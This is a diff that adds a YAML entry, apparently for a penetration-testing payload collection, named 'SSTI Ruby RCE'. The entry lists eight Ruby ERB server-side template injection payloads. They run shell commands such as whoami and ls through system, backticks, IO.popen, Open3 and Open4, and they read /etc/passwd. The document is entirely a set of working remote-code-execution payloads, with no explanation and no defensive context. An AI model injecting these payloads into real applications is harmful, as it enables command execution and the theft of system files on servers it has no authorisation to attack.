@@ -1,0 +1,21 @@
+name: SSTI Ruby RCE
+description: Different payloads for Ruby
+commands:
+  - command: |
+      <%= system("whoami") %>
+      <%= Dir.entries('/') %>
+      <%= File.open('/etc/passwd').read %>
+      <%= system('cat /etc/passwd') %>
+      <%= `ls /` %>
+      <%= IO.popen('ls /').readlines()  %>
+      <% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
+      <% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>
+    description:
+tags:
+  - ssti
+  - rce
+show:
+links:
+  -
+references:
+  -
